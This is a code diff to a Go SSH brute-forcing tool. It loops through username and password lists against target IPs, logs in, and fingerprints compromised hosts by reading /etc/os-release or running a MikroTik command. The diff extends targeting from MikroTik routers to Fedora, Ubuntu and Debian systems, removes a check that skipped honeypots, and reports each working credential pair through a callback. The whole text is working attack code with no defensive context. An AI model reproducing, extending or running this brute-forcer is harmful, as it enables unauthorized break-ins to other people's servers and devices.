@@ -20,7 +20,7 @@ type Bruteforcer interface {
 	brute(net.IP, uint16)
 }
 
-func NewBruteforcer(serviceType ServiceType, callback BruteCallback) SSHBruteforcer {
+func NewBruteforcer(serviceType ServiceType, callback BruteCallback) Bruteforcer {
 	switch serviceType {
 	case ServiceSSH:
 		return SSHBruteforcer{
@@ -32,10 +32,12 @@ func NewBruteforcer(serviceType ServiceType, callback BruteCallback) SSHBrutefor
 }
 
 type BruteResult struct {
-	IP   net.IP
-	Port uint16
-	User string
-	Pass string
+	IP          net.IP
+	Port        uint16
+	User        string
+	Pass        string
+	ServiceType ServiceType
+	Description string
 }
 
 type BruteCallback func(BruteResult)
@@ -58,13 +60,12 @@ type SSHBruteforcer struct {
 }
 
 func (b SSHBruteforcer) brute(ip net.IP, port uint16) {
-	var err error
 	userList := getUserList()
 	passList := getPassList()
 
 	for _, user := range userList {
 		for _, pass := range passList {
-			err = checkSSH(ip, port, user, pass)
+			os, err := checkSSH(ip, port, user, pass)
 			if err != nil {
 				if isFatalErrorSSH(err.Error()) {
 					return
@@ -72,32 +73,42 @@ func (b SSHBruteforcer) brute(ip net.IP, port uint16) {
 				continue
 			}
 
-			// Honeypot/IoT detection using random username and password
-			err = checkSSH(ip, port, "a75da392", "a75da392")
-			if err == nil {
-				return
-			}
-
-			b.callback(BruteResult{IP: ip, Port: port, User: user, Pass: pass})
+			b.callback(BruteResult{IP: ip, Port: port, User: user, Pass: pass, ServiceType: ServiceSSH, Description: os})
 			return
 		}
 	}
 }
 
-func checkSSH(ip net.IP, port uint16, user string, pass string) error {
+func checkSSH(ip net.IP, port uint16, user string, pass string) (os string, err error) {
+	var cmdOutput string
 	client, err := connectToHost(fmt.Sprintf("%s:%d", ip, 22), user, pass)
 	if err != nil {
-		return err
+		return "", err
 	}
 
 	defer client.Close()
 
-	result, _ := runCommand(client, "system resource print")
-	if strings.Contains(result, "MikroTik") {
-		return nil
+	distroMap := map[string]string{
+		"fedora": "Fedora",
+		"ubuntu": "Ubuntu",
+		"debian": "Debian",
 	}
 
-	return errors.New("Not a MikroTik")
+	cmdOutput, _ = runCommand(client, "cat /etc/os-release")
+	if len(cmdOutput) > 0 {
+		for id, distro := range distroMap {
+			if strings.Contains(cmdOutput, "ID="+id) {
+				return distro, nil
+			}
+		}
+	}
+
+	cmdOutput, _ = runCommand(client, "system resource print")
+	if strings.Contains(cmdOutput, "MikroTik") {
+		return "MikroTik", nil
+	}
+
+	return "", errors.New("can't detect OS")
 }
 
 func connectToHost(host string, user string, pass string) (*ssh.Client, error) {
@@ -122,7 +133,7 @@ func runCommand(client *ssh.Client, command string) (string, error) {
 		return "", err
 	}
 
-	time.AfterFunc(time.Second*5, func() {
+	time.AfterFunc(time.Second*10, func() {
 		session.Close()
 	})
 
@@ -143,7 +154,8 @@ func isFatalErrorSSH(err string) bool {
 		"no common algorithm for client to server cipher",
 		"i/o timeout",
 		"network is unreachable",
-		"no supported methods remain",
+		"getsockopt: connection refused",
+		"can't detect OS",
 	}
 
 	for _, fatalError := range stopErrors {
